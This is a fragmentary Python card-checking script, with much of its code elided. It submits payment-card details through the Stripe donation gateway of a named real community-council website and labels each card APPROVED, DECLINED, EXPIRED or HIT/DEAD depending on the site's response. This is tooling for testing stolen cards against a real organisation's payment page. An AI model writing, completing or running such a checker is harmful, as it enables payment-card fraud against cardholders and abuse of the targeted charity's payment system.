...
# ========== MAIN TELE FUNCTION FOR chestermeremuslimcouncil.com ==========
def Tele(ccx: str, gate_type: str = "ch1"):
    ...
    # Stripe publishable key for chestermeremuslimcouncil.com (from your curl)
    ...
    try:
        ...
        if success or any(k in str(message).lower() for k in ['thank', 'appreciate', 'success', 'redirect']):
        ...
        if status == "HIT":
            ...
            return f"📅 EXPIRED CARD", charge_amount, gateway_name
        elif status == "DEAD" and "declined" in str(message).lower():
            return f"❌ DECLINED - {message}", charge_amount, gateway_name
        else:
        ...
        r2_text = r2.text
        status, detail = classify_response(r2_text)
        
        if status == "HIT":
            return f"✅ APPROVED", charge_amount, gateway_name
        elif "thank" in r2_text.lower():
            return f"✅ APPROVED - {r2_text[:100]}", charge_amount, gateway_name
        else:
            return f"❌ {r2_text[:100]}", charge_amount, gateway_name
...
if __name__ == "__main__":
    ...
    print("Example: 4111111111111111|12|28|123")
